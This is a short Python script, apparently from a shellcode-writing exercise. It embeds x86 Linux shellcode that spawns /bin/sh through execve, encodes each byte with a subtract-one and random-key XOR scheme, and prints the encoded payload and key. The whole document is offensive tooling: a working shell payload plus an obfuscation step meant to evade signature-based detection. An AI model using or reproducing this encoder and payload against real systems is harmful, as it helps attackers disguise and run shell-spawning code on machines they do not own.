#!/usr/bin/env python

from random import randint

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

enc = ""
enc2 = ""
key = randint(1,127)

for x in bytearray(shellcode):
    z = x-1
    y = z ^ key

    enc += "\\x%02x" % y
    enc2 += "0x%02x," % y


print("Bytecode format of the shellcode is : %s \n" % enc)
print("Shellcode format of the shellcode is : %s \n" % enc2)
print("The dynamic key used is : 0x%x \n" % key)
